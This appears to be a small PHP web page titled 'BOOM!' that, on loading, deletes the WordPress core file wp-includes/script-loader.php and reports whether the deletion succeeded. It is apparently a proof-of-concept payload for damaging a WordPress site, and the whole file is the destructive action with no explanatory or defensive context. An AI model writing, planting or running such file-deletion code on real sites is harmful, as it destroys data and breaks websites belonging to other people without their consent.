<!DOCTYPE html>
<html>
<head>
	<title>BOOM!</title>
</head>
    <body>
        <h1>BOOM!</h1>
        <?php 	
            $target = "wp-includes/script-loader.php";
            
            if (file_exists($target)) {
                unlink($target);
            }

            if (file_exists($target)) {
                echo "Problem deleting" . $target;
            } else {
                echo "Successfuly deleted" . $target;
            }
        ?>
    </body>
</html>